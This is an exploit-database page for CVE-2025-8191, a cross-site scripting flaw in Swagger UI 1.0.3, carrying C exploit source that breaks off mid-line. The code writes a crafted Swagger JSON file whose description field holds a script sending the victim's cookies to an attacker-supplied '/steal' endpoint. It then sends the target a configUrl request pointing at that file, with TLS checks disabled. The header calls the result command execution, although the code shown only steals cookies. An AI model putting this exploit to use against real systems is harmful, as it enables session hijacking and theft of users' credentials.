---
title: Swagger UI 1.0.3 Cross-Site Scripting (XSS)
url: https://cxsecurity.com/issue/WLB-2025100015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-10-29
fetch_date: 2025-10-30T03:10:22.235725
---

# Swagger UI 1.0.3 Cross-Site Scripting (XSS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Swagger UI 1.0.3 Cross-Site Scripting (XSS)** **2025.10.29**  Credit:  **[ByteReaper0](https://cxsecurity.com/author/ByteReaper0/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-8191](https://cxsecurity.com/cveshow/CVE-2025-8191/ "Click to see CVE-2025-8191")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

/\*
\* Author : Byte Reaper
\* Telegram : @ByteReaper0
\* CVE : CVE-2025-8191
\* Title : Swagger UI 1.0.3 - Cross-Site Scripting (XSS)
\* Description : CVE-2025-8191, a vulnerability in the Swagger UI service due to poor description parameter filtering, leading to command execution on a remote server.
\*
\*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "argparse.h"
#include <curl/curl.h>
int portSel = 0;
int portServerSel = 0;
int selectFile = 0;
const char \*targetUrl = NULL;
const char \*cookies = NULL;
const char \*server = NULL;
const char \*yourFile = NULL;
const char \*payloadFile = "xss.json";
int targetPort = 0;
int yourPort = 0;
int verbose = 0;
int useCookies = 0;
struct Mem
{
char \*buffer;
size\_t len;
};
void exitAssembly()
{
\_\_asm\_\_ volatile
(
"mov $231, %%rax\n\t"
"xor %%rdi, %%rdi\n\t"
"syscall\n\t"
:
:
:"rax",
"rdi"
);
}
size\_t write\_cb(void \*ptr,
size\_t size, size\_t nmemb,
void \*userdata)
{
size\_t total = size \* nmemb;
struct Mem \*m = (struct Mem \*)userdata;
char \*tmp = realloc(m->buffer, m->len + total + 1);
if (tmp == NULL)
{
printf("\e[1;31m[-] Failed to allocate memory!\e[0m\n");
exitAssembly();
}
m->buffer = tmp;
memcpy(&(m->buffer[m->len]), ptr, total);
m->len += total;
m->buffer[m->len] = '\0';
return total;
}
void createFile(const char \*filename,
const char \*server)
{
FILE \*f = fopen(filename, "w");
if (f == NULL)
{
printf("\e[1;31m[-] Error Create file (xss.json)!\e[0m\n");
exitAssembly();
}
char payloadBuf[2048];
int lenFile = snprintf(
payloadBuf,
sizeof(payloadBuf),
"{\n"
" \"swagger\": \"2.0\",\n"
" \"info\": {\n"
" \"version\": \"1.0.0\",\n"
" \"title\": \"XSS Injection Demo\",\n"
" \"description\": \"<script>fetch('%s/steal?c='+encodeURIComponent(document.cookie))</script>\"\n"
" },\n"
" \"paths\": {}\n"
"}",
server
);
if (lenFile <= 0 || lenFile >= sizeof(payloadBuf))
{
printf("\e[1;31m[-] File payload too large!\e[0m\n");
fclose(f);
exitAssembly();
}
fwrite(payloadBuf,
1,
lenFile,
f);
fclose(f);
printf("\e[1;34m[+] File name: %s\e[0m\n",
filename);
printf("\e[1;34m[+] File created successfully.\e[0m\n");
printf("\e[1;35m============================= [PAYLOAD] =============================\e[0m\n");
printf("\e[1;34m[+] Payload content :\n%s\e[0m\n",
payloadBuf);
printf("\e[1;35m====================================================================\e[0m\n");
}
void sendRequest(const char \*baseUrl,
int targetPort,
const char \*server,
const char \*payloadFile)
{
const char \*filename = "xss.json";
createFile(filename, server);
CURL \*curl = curl\_easy\_init();
CURLcode res;
char full[4000];
if (curl == NULL)
{
printf("\e[1;31m[-] Error Create Object CURL !\e[0m\n");
exitAssembly();
}
struct Mem server\_Rsponse =
{
NULL,
0
};
server\_Rsponse.buffer = NULL ;
server\_Rsponse.len = 0;
if (curl)
{
if (portSel)
{
int len1 = snprintf(full,
sizeof(full),
"%s:%d/swagger-ui/index.html?configUrl=%s/%s",
baseUrl,
targetPort,
server,
payloadFile);
if (len1 < 0 || len1 >= (int)sizeof(full))
{
printf("\e[1;31m[-] URL is Long !\e[0m\n");
printf("\e[1;31m[-] FULL URL Len : %d\e[0m\n", len1);
exitAssembly();
}
}
if (portServerSel)
{
int len2 = snprintf(full,
sizeof(full),
"%s/swagger-ui/index.html?configUrl=%s:%d/%s",
baseUrl,
server,
yourPort,
payloadFile);
if (len2 < 0 || len2 >= (int)sizeof(full))
{
printf("\e[1;31m[-] URL is Long !\e[0m\n");
printf("\e[1;31m[-] FULL URL Len : %d\e[0m\n", len2);
exitAssembly();
}
}
if (selectFile)
{
int len3 = snprintf(full,
sizeof(full),
"%s:%d/swagger-ui/index.html?configUrl=%s/%s",
baseUrl,
targetPort,
server,
yourFile);
if (len3 < 0 || len3 >= (int)sizeof(full))
{
printf("\e[1;31m[-] URL is Long !\e[0m\n");
printf("\e[1;31m[-] FULL URL Len : %d\e[0m\n", len3);
exitAssembly();
}
}
else
{
int len4 = snprintf(full,
sizeof(full),
"%s:%d/swagger-ui/index.html?configUrl=%s/%s",
baseUrl,
targetPort,
server,
payloadFile);
if (len4 < 0 || len4 >= (int)sizeof(full))
{
printf("\e[1;31m[-] URL is Long !\e[0m\n");
printf("\e[1;31m[-] FULL URL Len : %d\e[0m\n", len4);
exitAssembly();
}
}
curl\_easy\_setopt(curl,
CURLOPT\_URL,
full);
if (useCookies)
{
curl\_easy\_setopt(curl,
CURLOPT\_COOKIEFILE,
cookies);
curl\_easy\_setopt(curl,
CURLOPT\_COOKIEJAR,
cookies);
}
curl\_easy\_setopt(curl,
CURLOPT\_FOLLOWLOCATION,
1L);
curl\_easy\_setopt(curl,
CURLOPT\_WRITEFUNCTION,
write\_cb);
if (verbose)
{
printf("\e[1;35m------------------------------------------[Verbose Curl]------------------------------------------\e[0m\n");
curl\_easy\_setopt(curl,
CURLOPT\_VERBOSE,
1L);
}
curl\_easy\_setopt(curl,
CURLOPT\_WRITEDATA,
&server\_Rsponse);
curl\_easy\_setopt(curl,
CURLOPT\_CONNECTTIMEOUT,
5L);
curl\_easy\_setopt(curl,
CURLOPT\_TIMEOUT,
10L);
curl\_easy\_setopt(curl,
CURLOPT\_SSL\_VERIFYPEER,
0L);
curl\_easy\_setopt(curl,
CURLOPT\_SSL\_VERIFYHOST,
0L);
struct curl\_slist \*headers = NULL;
headers = curl\_slist\_append(headers,
"Accept-Language: en-US,en");
headers = curl\_slist\_append(headers,
"Connection: keep-alive");
char ref[500];
snprintf(ref , sizeof(ref), "Referer: %s",
server);
headers = curl\_slist\_append(headers,
ref);
curl\_easy\_setopt(curl,
CURLOPT\_HTTPHEADER,
headers);
res = curl\_easy\_perform(curl);
curl\_slist\_free\_all(headers);
if (res == CURLE\_OK)
{
double timeD;
double downloadTime;
long httpCode = 0;
long size;
curl\_off\_t content\_length;
curl\_off\_t connectTime;
curl\_easy\_getinfo(curl,
CURLINFO\_APPCONNECT\_TIME,
&connectTime);
curl\_easy\_getinfo(curl,
CURLINFO\_SIZE\_DOWNLOAD\_T,
&content\_length);
curl\_easy\_getinfo(curl,
CURLINFO\_HEADER\_SIZE,
&size);
printf("\e[1;36m[+] Time: %" CURL\_FORMAT\_CURL\_OFF\_T ".%06ld\e[0m\n", connectTime / 1000000,
(long)(connectTime % 1000000));
printf("\e[1;36m[+] Size: %.0f\n",
connec...